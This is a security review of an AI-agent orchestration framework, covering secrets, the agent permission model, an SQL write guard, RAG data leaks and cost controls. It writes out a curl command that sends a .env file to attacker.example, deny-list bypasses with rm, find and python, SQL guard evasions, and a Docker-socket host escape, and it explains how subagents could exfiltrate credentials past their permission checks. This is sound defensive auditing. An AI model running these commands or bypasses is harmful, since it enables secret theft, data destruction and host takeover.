# Cycle 1 — Production-Readiness Critic Review

**Reviewer:** Independent senior staff engineer
**Date:** 2026-04-14
**Scope:** Soup framework hardening for Streck internal apps handling real
user data, ADO/GitHub credentials, production Postgres, potentially PII.

---

## 1. Secrets handling

**Findings — mixed.**

`.env.example` is clean: every key is an empty placeholder, no literal
credentials. `.gitignore` correctly ignores `.env` and `.env.local`.
`post_tool_use.py` redacts on both key-matching (`secret|token|key|password|
passwd|pwd|api[_-]?key|auth`) and post-serialization regex — good defense in
depth. Article VI and `rules/global/security.md §2` codify the intent.

**Gaps.**

- **No secret scanning pre-commit.** Constitution VI.3 says "pre-commit hook
  scans for high-entropy strings" but no such hook exists in `.claude/hooks/`
  and no `gitleaks` / `detect-secrets` config is shipped. Commitment not
  backed by mechanism.
- **`postgres-init.sql` hard-codes `PASSWORD 'soup'`.** This file is bind-
  mounted into prod containers in the same way as dev (no separation). If it
  were ever run against a shared env, the weak default persists.
- **`docker-compose.yml` fallback defaults.** `${POSTGRES_PASSWORD:-soup}` —
  missing env yields the literal `soup` password silently. An operator who
  forgets to set the var gets a "working" DB that anyone on the network can
  reach on port 5432 (port is published to the host unconditionally).
- **`ADO_PAT` re-exported as `AZURE_DEVOPS_EXT_PAT`** (ado.py:43). Fine, but
  it is placed into the subprocess env dict which is then propagated to
  every child. If the child logs its environment (easy mistake), the PAT
  leaks.
- **`rag/client.py::_apply_postgres_env`** parses the DSN and stuffs user +
  password into `POSTGRES_PASSWORD` env vars — readable by any subprocess
  after import. Combined with `agent_factory.spawn` doing
  `full_env = {**os.environ, **(env or {})}`, every Claude subagent inherits
  the full secret surface: `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `ADO_PAT`,
  Postgres password, all of them. An agent that can run `env` or read
  `/proc/self/environ` can exfiltrate them.
- **`session_start.py` logs `missing_env` list** (fine) but the dotenv
  counter is generic (`"dotenv_loaded": len(loaded)`), which is OK.
- **Redaction regex miss.** The loose regex requires a key-ish prefix; a
  stray value such as `ghp_*`, `xoxb-*`, an `sk-ant-*` or PEM header is not
  caught. High-entropy detection exists "in theory" only.
- **Agent stderr event stream.** `agent_factory._forward_stderr_events`
  copies hook-emitted JSON verbatim into the session JSONL with no
  redaction layer of its own. If a hook ever echoes raw tool-input it
  already redacted, we are fine; if not, secrets slip.

## 2. Permission model

**Findings — weak.**

The `allow` list is permissive (`Bash(python:*)`, `Bash(pip install:*)`,
`Bash(npm:*)`, `Bash(docker:*)`, `Bash(mkdir:*)`, `Bash(echo:*)`). The
`deny` list targets specific destructive *forms* (`rm -rf /`, `rm -rf *`)
but Claude Code's permission matcher is prefix/glob, not semantic. A
subagent can bypass trivially:

- `Bash(rm -r <path>)` — deny list only targets `rm -rf`, not `rm -r`.
- `Bash(find . -delete)` — `find:*` is allowed, `-delete` is not filtered.
- `Bash(python -c "import shutil; shutil.rmtree('/')")` — `python:*` allows
  anything; the Python tool permission is a general interpreter.
- `Bash(git push --force-with-lease feature/...)` — denied only on `main` /
  `master`. Force push to any other branch is allowed — fine for feature
  branches, but the deny covers literal origin paths; alternate remotes (a
  rogue fork) are not constrained. Note also the denylist targets specific
  forms — `git push --force` is in deny; `git push -f origin` is, but a
  spelled-out `git push --force-with-lease origin arbitrary-branch` is not.
- `Bash(eval:*)` is denied, but Claude's Bash tool does not expose `eval`
  as a distinct command — it invokes a shell that can run arbitrary code.
- **`ask` list** is only four entries: `git push`, `npm publish`,
  `docker push`, `gh pr merge`. Anything else with side-effects (e.g.
  `az repos pr set-vote`, destructive pipeline runs, `psql -c 'DROP...'`)
  proceeds without a prompt. A runaway subagent absolutely *can* exfiltrate:
  `curl -X POST -d @/workspace/.env https://attacker.example`. `curl:*` is
  not in allow but it is not in deny either — behavior depends on default
  policy (Claude Code defaults differ by mode).
- **No path-scope enforcement at the harness level.** `SOUP_FILES_ALLOWED`
  is only read by the `pre_tool_use` hook for Edit/Write/MultiEdit. Bash
  with `cat > file` / `python -c 'open(...)'` is not gated by it. So the
  file-scope is advisory, not enforced.
- **Constitution IX.3 requires "no half-committed state to main"**, but
  nothing at the permission layer prevents `git checkout main && git
  commit`. Only `git push` to main is denied.

## 3. SQL injection / write safety

**Findings — the `--allow-write` guard is not robust.**

`cli_wrappers/psql.py::_is_write` strips comments with two regexes, then
scans for `\b(INSERT|UPDATE|DELETE|TRUNCATE|CREATE|DROP|ALTER|GRANT|
REVOKE|COPY)\b`. Known bypasses:

- **`SELECT pg_write_file(...)` / `SELECT setval(...)` / functions with
  side effects** (e.g. `SELECT nextval('s')`, `SELECT lo_import(...)`,
  `SELECT dblink_exec(...)`). The list is keyword-based; side-effecting
  functions are not in it.
- **CTE write passthrough:** `WITH x AS (INSERT INTO t VALUES (1) RETURNING
  *) SELECT * FROM x;` — `INSERT` is caught here (it is in the list) only
  because `\b` matches inside the CTE; good. But `WITH x AS (SELECT
  pg_sleep(60)) SELECT * FROM x;` is waved through — DoS vector.
- **`DO $$ ... $$;` blocks** can perform writes without any of the listed
  keywords appearing at the top of the string (they appear inside string
  literals which the regex still matches, but a payload can use dynamic
  SQL built from concat: `DO $$ BEGIN EXECUTE 'INS'||'ERT INTO...'; END
  $$;` — the top-level regex sees nothing.
- **Multi-statement queries:** psycopg will execute multiple semicolon-
  separated statements. `SELECT 1; DELETE FROM users;` — the regex catches
  DELETE, good. But a statement chain with writes disguised via quoted
  literals or line-splitting (the `/* */` stripper is non-greedy but
  works) can still surprise. Nested `/* /* */ */` — re is not recursive.
- **Comment stripper is single-pass** — `--\n INSERT` is caught; but an
  attacker never puts a comment in front of their payload; this direction
  is fine. The reverse is what matters: `SELECT 1 /* INSERT INTO */ ;` —
  the stripper *removes* the INSERT, so the write guard would PERMIT a
  statement that looks scary. Net: false negatives are possible for
  writers who hide keywords inside stripped comments, and false positives
  for SELECTs that name a column `insert_ts` (word-boundary catches
  `insert_ts` — would block a benign read; I verified: `\bINSERT\b`
  matches `INSERT_ts`? No — `_` is a word char, so `\b` does not match
  between `T` and `_`. OK. But `INSERT.ts` would match.) Mixed risk.
- **No parameterization interface.** `cli query <sql>` takes raw SQL.
  Agents cannot pass params. Every caller is either trusted not to
  concatenate, or is concatenating. Tests, log lines, and LLM-composed
  SQL all go through the same path. The wrapper is a footgun.
- **`_ensure_migrations_table`** runs `CREATE TABLE IF NOT EXISTS` at
  runtime — violates `rules/postgres/migrations.md §3`, which explicitly
  bans runtime DDL and names `EnsureCreated()` as the banned pattern.

## 4. Dependency surface

`pyproject.toml` uses **floor-only pins** (`>=X`). Supply-chain risk is
real:

- `lightrag-hku>=1.0` pulls an unaudited embedding/graph stack with its
  own deep tree (OpenAI client, networkx, tiktoken, nano-vectordb, etc.).
- `anthropic>=0.40` — any 0.x or 1.x release auto-installs; breaking
  changes in the SDK propagate silently.
- `mcp>=1.0`, `click>=8.1`, `tenacity>=9.0` — all floor-only.
- `ruff` and `mypy` are **unpinned** (no version spec at all). Any future
  release can break lint CI silently.
- No lockfile committed (no `uv.lock`, `poetry.lock`, `requirements.txt`).
  Dev and CI will resolve differently over time. Fix: commit `uv.lock`,
  run `pip-audit`/`uv pip compile --audit` in CI.
- `rules/global/security.md §1.6` demands `pip-audit` in CI — no CI config
  shipping that check is present (no `.github/workflows/`, no `.azure-
  pipelines/`).

## 5. RAG data boundary

**Findings — ingestion can leak secrets from source repos.**

`rag/sources/github.py`:

- `_TEXT_EXTS` includes `.yaml`, `.yml`, `.json`, `.toml`, `.ini`, `.sh`,
  `.bash` — all common secret carriers. No filename exclusion list:
  `.env`, `.env.*`, `secrets.yaml`, `credentials.json`, `id_rsa*`,
  `*.pem` are indexable if their extension matches; `.env` has no
  extension so it is skipped by the ext filter, but `.env.production`
  ends in `.production` and is skipped — yet `config.json`,
  `secrets.yaml`, `.github/workflows/*.yml` with inline tokens are
  ingested verbatim.
- 1.5 MB per-file cap is advisory only; cumulatively the RAG db can hold
  gigabytes of private source. No `--exclude` argument wired in.
- Citations are stored alongside content. An LLM retrieving a chunk can
  surface `[secrets.yaml#10-20]` verbatim, including the secret value,
  into a prompt or answer. There is no token-level redaction in the
  retrieval path; `post_tool_use` only filters structured log JSON.

`rag/sources/ado_wiki.py`:

- Pulls entire wikis recursively (`recursionLevel=full`). Customer data
  in the wiki (incident notes, PII-bearing tickets cross-linked in pages)
  flows to the RAG store with no allow-list / deny-list per page path.
- Uses Basic auth with the PAT as password over `dev.azure.com`; OK (TLS),
  but `httpx.BasicAuth` value lives in memory for the process lifetime.

`rag/client.py`:

- `_anthropic_complete` uses `AsyncAnthropic()` with default auth (env
  var). Prompts containing retrieved content — possibly including
  secrets — travel to Anthropic's API. This is a data-egress decision that
  should be explicit in the Streck data policy; it is implicit today.

## 6. Cost controls

**Findings — Constitution Article VIII is aspirational, not enforced.**

- `ExecutionPlan.budget_sec` **is** enforced in `orchestrator.run`: wall-
  clock deadline, aborts before next wave (lines 95-108). Good.
- Per-step `max_turns` is forwarded as a CLI flag; we trust Claude Code
  to respect it. Fine if the flag is real; otherwise a runaway subagent
  can burn tokens.
- **No token-budget enforcement.** Architecture §7.1 admits "Token
  budgets are advisory (logged, not enforced) at v1." A single opus run
  that loops can spend hundreds of dollars before `budget_sec` fires.
- **Model tier is a string in the plan.** Nothing validates that
  `orchestrator`/`meta-prompter` are the only opus users — any step can
  set `model: claude-opus-4-6` and the orchestrator spawns it. The
  Constitution rule lives in docs only.
- **No per-run cost cap.** `experiments.tsv` writes `duration_sec` and
  plan metadata but not `cost_usd` — ARCHITECTURE.md §7 lists a
  `cost_usd` column that is *not* emitted by
  `orchestrator._append_experiment` (I counted: it writes ts, run_id,
  status, duration_sec, n_steps, budget_sec, goal). Dashboards promised
  are not wired.
- **Fix-cycles compound cost.** `max_fix_cycles_per_step = 2` → each
  failing step triggers up to 2 extra subagents; nothing caps the
  aggregate tokens across retries.
- **RAG embedding cost via OpenAI** (`openai_embed`, 1536 dim) — a full
  ADO wiki reindex burns OpenAI spend with no budget guard.

## 7. Observability

**Findings — structured logs exist but correlation is partial.**

- JSONL per session in `logging/agent-runs/session-<id>.jsonl` — good.
- `session_id` generated by `agent_factory.spawn` as
  `f"{agent}-{uuid[:10]}"` — not globally unique across orchestrator runs,
  and **not the same** as the `run_id` used by `orchestrator.state`.
  Triage requires joining on step_id, which is manual.
- **No parent run_id propagation.** A subagent's JSONL records do not
  carry the parent `run_id`; the orchestrator writes a separate state
  file under `.soup/runs/<run_id>.json`, but lookup from "this log line"
  → "which run" requires either timestamp range guessing or scanning
  state files.
- **`experiments.tsv` columns drift** from what ARCHITECTURE.md promises
  (no tokens_in/out, no cost, no verdict). Two different emitters
  (`stop.py` writes a 4-col schema, `orchestrator._append_experiment`
  writes a 7-col schema with different headers). TSV corruption
  guaranteed under concurrent writers.
- **No OpenTelemetry / Prometheus / structured ship-out.** Security rule
  §1.9 mandates "ship to the org sink" — no exporter wired.
- **No PII scrubbing on log bodies.** `input_summary` is capped at 200
  chars, `output_summary` at 500 — lucky guess prevents bulk leaks, but a
  single 200-char value can still contain an email / SSN / PAT.

## 8. Failure modes

| Failure | Today's behavior | Gap |
|---|---|---|
| Anthropic API down | `agent_factory.spawn` returns `failed`; fix-cycle retries (also failing). `budget_sec` eventually aborts. | No circuit breaker; will retry `max_fix_cycles_per_step * waves` times. No distinguish between 429/5xx/down. |
| Postgres down | `LightRagClient._ensure_initialized` logs warning, sets `_rag = None`, raises `RagUnavailable` on `search`. Subagent receives `None` (no RAG context) and proceeds — silent degradation. | Hook should FAIL CLOSED when RAG policy says retrievals are mandatory; today it fails open. |
| Git push fails | Orchestrator does not push — it only commits. Humans push. | `_atomic_commit` swallows errors in `result.extra["commit_error"]`; the step is still marked passed. Dirty-tree bug: no `git status --porcelain` check. |
| `verify_cmd` hangs | `subprocess.run(..., timeout=900s)` → `TimeoutExpired` → exit 124 returned. | 15 min is long; no per-step override. `shell=True` with operator-supplied string = injection risk if step.verify_cmd is ever LLM-generated (it *is* LLM-generated by the meta-prompter). |
| Two waves race-commit | `_run_wave` spawns parallel subagents; they share the worktree cwd and `git add -A` each other's work. Second commit catches everything. | Not atomic per step; interleaved writes + single `git add -A` blur authorship. No per-step worktree branch. |
| Hook throws | All hooks wrap main in try/except, emit empty `additionalContext`, exit 0. | Fail-soft is correct for UX but masks misconfigurations. A broken `pre_tool_use` silently disables file-scope enforcement AND rule injection — no alarm. |

## 9. Audit trail

**Findings — reconstructable but not tamper-evident.**

- Who asked: `UserPromptSubmit` log line carries the prompt text.
- Which agent did what: session JSONL per agent, step_id tagged.
- Which commit ↔ which spec: commit message is
  `{agent}({step.id}): {prompt[:60]}`. The plan JSON under
  `.soup/plans/<ts>-<slug>.json` carries `constitution_ref` and steps;
  linking requires run_id → plan file. Join is manual.
- **No hashing / signing of plans or logs.** JSONL is mutable text;
  nothing prevents post-hoc edit. TSV likewise.
- **No actor identity.** `session_id` is a UUID; Streck's AD identity of
  the operator is nowhere in the trail. A compliance auditor cannot
  answer "which employee issued this plan?" — they can only see "some
  session on laptop X".
- **.soup/ is `.gitignore`d.** The audit trail never enters git, never
  replicates to a central store. Local-disk loss = audit loss.
- **Commit not GPG-signed.** No signing enforcement in permissions; the
  Constitution does not mandate it.

## 10. Windows-specific

Operating on `win32` with bash-via-Git-Bash behind the justfile:

- **`justfile` uses `set shell := ["bash", "-cu"]`.** On Windows without
  Git Bash / WSL, `just init` fails at `. .venv/bin/activate`. The
  fallback `. .venv/Scripts/activate` is the Windows venv path, but it
  only runs if the first `activate` fails silently — `set -u` makes
  unset var errors fatal though the `||` guards. Fragile.
- **Line endings.** `.gitattributes` is absent. Python files committed
  with CRLF on Windows will break shebangs in the Linux dev container
  (`#!/usr/bin/env python` + `\r\n` → `env: 'python\r': No such file`).
- **Docker socket bind** (`/var/run/docker.sock`). On Windows Docker
  Desktop, the equivalent is `//var/run/docker.sock` or a named pipe
  (`//./pipe/docker_engine`). The compose file as-written will fail on
  Windows host → containers cannot run `docker` against the host.
  Furthermore, **mounting the host docker socket = container escape
  primitive**. A subagent inside soup-dev can `docker run
  --privileged -v /:/host ubuntu chroot /host` and own the host.
  Critical.
- **Path canonicalization in hooks.** `pre_tool_use._matches_any` does
  `str(p).replace("\\", "/")` — handles Windows paths, good. But
  `_project_root` walks up 6 levels — on Windows with long `C:\Users\
  ethan\...` paths, OK. No symlink traversal protection though.
- **`fnmatch`-based glob** is case-sensitive on Linux, insensitive on
  Windows. A file-scope `src/*.py` will match differently across dev
  and CI, letting edits slip through on Windows that would be blocked
  on Linux.
- **`SOUP_LOG_DIR` default uses Linux path join**, fine on both OSes.

---

## Top 10 prod risks

| # | Risk | Severity | Evidence | Mitigation |
|---|------|----------|----------|------------|
| 1 | Docker socket mounted to dev container → container escape / host takeover | **CRITICAL** | `docker-compose.yml` L52: `- /var/run/docker.sock:/var/run/docker.sock` in `soup-dev` service | Remove the mount; if `docker` inside the container is really needed, use `docker:dind` sibling service or `sysbox`. Never share the host socket with an agent-executing container. |
| 2 | `psql-wrap --allow-write` guard bypassable; raw-SQL-only interface with no parameterization → SQL injection in prod queries | **CRITICAL** | `cli_wrappers/psql.py::_is_write` keyword regex; `query` takes one positional `sql` string; `_ensure_migrations_table` runs DDL at runtime contra `rules/postgres/migrations.md §3` | Add a parameterized subcommand (`query --param k=v`); swap keyword regex for an explicit read-only SQL parser (pg-query-go / libpg_query / `BEGIN READ ONLY`); move migrations-bookkeeping DDL into a real migration. |
| 3 | Subagents inherit full env (`ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `ADO_PAT`, PG password); permission allow-list on `python:*` / `echo:*` / `find:*` / `curl` means exfiltration is one tool-call away | **CRITICAL** | `agent_factory.spawn` L167 `full_env = {**os.environ, **(env or {})}`; `.claude/settings.json` has no `curl` in deny; `python:*` permits arbitrary code | Minimum-env for subagents (only the vars each step declares); deny-list `curl`, `wget`, `python -c`, `python -m http.server`; move secrets to an auth-proxy (Key Vault-backed ephemeral tokens). |
| 4 | RAG ingests `secrets.yaml`, `*.json`, `*.yml` including CI workflow tokens; egresses content to Anthropic via `_anthropic_complete` | **HIGH** | `rag/sources/github.py::_TEXT_EXTS`; no filename deny-list; `rag/client.py::_anthropic_complete` sends prompts externally | Add deny patterns (`.env*`, `*secret*`, `*credentials*`, `**/.github/**`, `**/id_rsa*`, `*.pem`, `.npmrc`, `.pypirc`); scan chunks for high-entropy tokens before index; route ingestion LLM calls through an allow-listed model gateway. |
| 5 | Runtime DDL (`CREATE TABLE IF NOT EXISTS schema_migrations`) violates `rules/postgres/migrations.md §3` | **HIGH** | `cli_wrappers/psql.py::_ensure_migrations_table` L127-137 | Ship a `0000_init.sql` migration for the bookkeeping table; remove the DDL path from runtime code. |
| 6 | `verify_cmd` is LLM-generated + executed with `shell=True` → command injection channel for a poisoned plan | **HIGH** | `orchestrator.py::_run_verify` L263 `subprocess.run(verify_cmd, shell=True, ...)`; plan comes from meta-prompter | Parse `verify_cmd` through `shlex.split`; run without shell; limit to an allow-list of binaries (`pytest`, `dotnet test`, `vitest`, `ruff`, `mypy`, `just verify-*`). |
| 7 | No token/$ budget enforcement; model-tier rule (Article VIII) is advisory → runaway opus spend | **HIGH** | `ARCHITECTURE.md §7.1` "Token budgets are advisory (logged, not enforced) at v1"; `orchestrator._append_experiment` has no cost column | Enforce per-plan and per-step `max_tokens` via the Anthropic SDK (already supported). Reject plans where non-allow-listed agents request `opus`. Add `cost_usd_cap` aborting before the cap is hit. |
| 8 | `postgres-init.sql` hard-codes password `'soup'`; compose file defaults `${POSTGRES_PASSWORD:-soup}` and publishes port 5432 | **HIGH** | `docker/postgres-init.sql` L10; `docker/docker-compose.yml` L17/L20 | Fail container startup if `POSTGRES_PASSWORD` is unset; bind port to `127.0.0.1:5432` only; rotate the init SQL to read an env-substituted placeholder. |
| 9 | No audit-trail integrity: logs + plans are plain mutable JSONL/TSV, `.soup/` is `.gitignore`d, no actor identity, no signing | **MEDIUM** | `.gitignore` L28-30; `stop.py` + `orchestrator._append_experiment` write parallel TSV schemas; no hash chain | Ship logs to an append-only sink (org log aggregator, or at minimum a `git log`-style hash chain). Record AD identity (read `USERNAME` / `USERPRINCIPALNAME`). Sign plan JSON with a local key before execution. |
| 10 | `.claude/settings.json` deny list is string-prefix based and trivially circumvented; no path-scope on Bash tool; no `curl`/`wget` deny | **MEDIUM** | `.claude/settings.json` L97-132; `Bash(python:*)` allow admits any code; `find:*` admits `-delete` | Switch to an allow-list only model; add semantic deny (`curl`, `wget`, `nc`, `ssh`, `scp`, `python -c`, `python -m http.server`, `base64`, `gpg --encrypt`); route all tool calls through a policy daemon with path-scope enforcement. |

---

**Verdict.** Soup's ambition — a production framework for Streck internal
apps with real PII and customer data — is not matched by the current
guardrails. The orchestration shape is sound; the hook and log plumbing is
thoughtful. But three CRITICAL issues (host Docker socket, SQL write guard,
secret exfiltration path via subagent env + broad Bash allow-list) make
shipping a customer-data app on this framework reckless today. The HIGH
issues (LLM-driven `verify_cmd`, runtime DDL, cost non-enforcement, compose
defaults) each deserve a blocker before any real ADO/GitHub PAT is wired
in. Constitution is well-written but its enforcement surface is about 40%
of what it promises — close the gap before declaring v1.
